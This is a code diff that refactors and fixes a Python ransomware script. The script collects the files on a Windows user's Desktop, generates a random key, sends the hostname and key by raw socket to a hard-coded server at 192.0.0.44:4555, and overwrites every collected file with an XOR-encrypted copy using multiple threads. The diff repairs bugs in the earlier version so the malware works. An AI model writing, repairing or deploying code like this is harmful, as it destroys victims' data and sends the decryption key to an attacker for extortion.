@@ -2,82 +2,98 @@ import random
 import os
 import threading
 import queue
-// import socket
+import socket  # Previously commented out
+import traceback
 
-# Encryption function that the threads will call
-def encrypt(key):
+# Configuration
+IP_ADDR = '192.0.0.44'
+PORT = 4555
+ENCRYPTION_LEVEL = 512 // 8
+KEY_CHAR_OPTIONS = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~`!@#$%^&*()_+=-<>?'
+
+# Thread-safe queue
+q = queue.Queue()
+
+
+# XOR Encryption Function
+def encrypt_file(key):
     while True:
-        file = q.get()
-        print(f'Encrypting {file}')
+        file_path = q.get()
+        print(f'Encrypting {file_path}')
         try:
             key_index = 0
-            max_key_index = len(key) - 1
-            encrypted_data = ''
-            with open(file, 'rb') as f:
+            max_key_index = len(key)
+
+            with open(file_path, 'rb') as f:
                 data = f.read()
-            with open(file, 'w') as f:
-                f.write()
+
+            encrypted_data = bytearray()
             for byte in data:
                 xor_byte = byte ^ ord(key[key_index])
-                with open(file, 'ab') as f:
-                    f.write(xor_byte.to_bytes(1, 'little'))
+                encrypted_data.append(xor_byte)
+                key_index = (key_index + 1) % max_key_index
 
-                if key_index >= max_key_index:
-                    key_index = 0
-                else:
-                    key_index += 1
-            print(f'{file} encrypted successfully')
-        except:
-            print(f'Failed to encrypt {file}')
-        q.task_done()
+            # Overwrite the original file with encrypted data
+            with open(file_path, 'wb') as f:
+                f.write(encrypted_data)
 
-# socket info
-ipAddr = '192.0.0.44'
-port = 4555
+            print(f'Successfully encrypted {file_path}')
+        except Exception as e:
+            print(f'Failed to encrypt {file_path}: {e}')
+            traceback.print_exc()
+        finally:
+            q.task_done()
 
-# encryption info
-encryptionLevel = 512 // 8
-keyCharOptions = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~`!@#$%^&*()_+=-<>?'
-keyCharOptionsLen = len(keyCharOptions)
 
-# grab the files to encrypt
-print('Getting files ready...')
-desktopPath = os.environ['USERPROFILE'] + '\\Desktop'
-files = os.listdir(desktopPath)
-absFiles = []
-for f in files:
-    if os.path.isfile(f'{desktopPath}\\{f}') and f != __file__[:-2]+'exe':
-        absFiles.append(f'{desktopPath}\\{f}')
-print('successfulle located all te files')
+def generate_key(length):
+    return ''.join(random.choice(KEY_CHAR_OPTIONS) for _ in range(length))
 
-# grab clients hostname
-hostname = os.getenv('COMPUTERNAME')
 
-# generate the key
-print('generating the key')
-key = ''
-for i in range(encryptionLevel):
-    key += keyCharOptions[random.randint(0, keyCharOptionsLen = 1)]
-print('key generated')
+def get_desktop_files():
+    print('Gathering files from Desktop...')
+    desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
+    abs_files = []
 
-# connect to the server and send the key and hostname
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((ipAddr, port))
-    print('successfully connected. sending hostname and key...')
-    s.send(f'{hostname} : {key}'.encode('utf-8'))
-    print('finished transmitting data')
-    s.close()
+    for filename in os.listdir(desktop_path):
+        file_path = os.path.join(desktop_path, filename)
+        if os.path.isfile(file_path) and not filename.endswith('.exe'):
+            abs_files.append(file_path)
 
-# store the files in a queue for the threads to handle
-q = queue.Queue()
-for f in absFiles:
-    q.put(f)
+    print(f'Found {len(abs_files)} files to encrypt.')
+    return abs_files
 
-# setup threads to get ready for encryption
-for i in range(10):
-    t = threading.Thread(target=encrypt, args=(key,), daemon=True)
-    t.start()
 
-q.join()
-print('encryption and upload complete')
-input()
+def main():
+    try:
+        hostname = os.getenv('COMPUTERNAME')
+        files = get_desktop_files()
+        key = generate_key(ENCRYPTION_LEVEL)
+
+        print('Connecting to server...')
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.connect((IP_ADDR, PORT))
+            print('Connected. Sending hostname and key...')
+            s.send(f'{hostname} : {key}'.encode('utf-8'))
+            print('Transmission complete.')
+
+        # Queue up files for threads
+        for f in files:
+            q.put(f)
+
+        # Start threads
+        for _ in range(10):
+            t = threading.Thread(target=encrypt_file, args=(key,), daemon=True)
+            t.start()
+
+        q.join()
+        print('Encryption complete.')
+
+    except Exception as e:
+        print(f'Error: {e}')
+        traceback.print_exc()
+
+    input('Press Enter to exit...')
+
+
+if __name__ == '__main__':
+    main()
